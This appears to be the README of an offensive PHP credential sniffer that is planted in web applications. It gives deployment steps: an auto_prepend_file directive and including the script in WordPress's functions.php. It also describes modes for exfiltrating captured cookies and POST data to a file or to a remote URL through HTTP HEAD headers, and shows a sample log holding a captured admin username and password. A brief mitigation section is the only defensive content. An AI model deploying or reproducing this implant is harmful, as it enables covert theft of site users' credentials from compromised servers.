# HTTP Credential Sniffer (for PHP Applications)

This is a simple script that will detect and log any credential communication over cookies and get/post requests and exfiltrate to somewhere. This method monitors data into application context/environment so cannot be defeated by the use of SSL.

## Installation / Deploy

Use the auto_prepend_file trick
```
php_value auto_prepend_file /var/www/path/to/hcs.php
```

Include into an important bootstrap file (like Wordpress' Themes function.php)
```php
include_once "hcs.php"
```

## Exfiltration Modes
* HCS_EXF_FILE -> Saves on a text file defined on 'HCS_EXF_FILE_FILENAME' constant (be sure to check file permissions!)
* HCS_EXF_HTTP_HEAD -> Issues an HTTP HEAD request via curl (requires php_curl) with X-HCS-Payload header containing the data (base64-encoded for compatibility, not evasion)

### Exfiltrating to a file
Sample output
```
#### HCS LOG START ## 01/03/2014 23:54:10 ####
Array
(
    [POST] => Array
        (
            [log] => admin
            [pwd] => notmypassword!
            [wp-submit] => Log In
            [redirect_to] => http://testwp/wordpress/wp-admin/
            [testcookie] => 1
        )

    [SERVER] => Array
        (
            [HTTP_HOST] => testwp
            [HTTP_USER_AGENT] => Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:27.0) Gecko/20100101 Firefox/27.0
            [HTTP_ACCEPT] => text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
            [HTTP_ACCEPT_LANGUAGE] => en-US,en;q=0.5
            [HTTP_ACCEPT_ENCODING] => gzip, deflate
            ...
            [REQUEST_URI] => /wordpress/wp-login.php
            [SCRIPT_NAME] => /wordpress/wp-login.php
            [PHP_SELF] => /wordpress/wp-login.php
            [REQUEST_TIME] => 1393728850
        )

)
### HCS LOG END ###

```

### HTTP Head

HCS will issue an HTTP HEAD request to the url supplied in 'HCS_EXF_HTTP_HEAD_URL' constant.
The header name is configured under the 'HCS_EXF_HTTP_HEAD_HEADER' constant.
You'll need to code your own data receiver or use the sample header_dumper.php.

## Mitigation
* Use [OTP](http://en.wikipedia.org/wiki/One-time_password)
* Use Hash-based challenge-response authentication with [Nonces](http://en.wikipedia.org/wiki/Cryptographic_nonce) (dangerous if incorrectly implemented)

## To-do
* Add HTTP Auth support
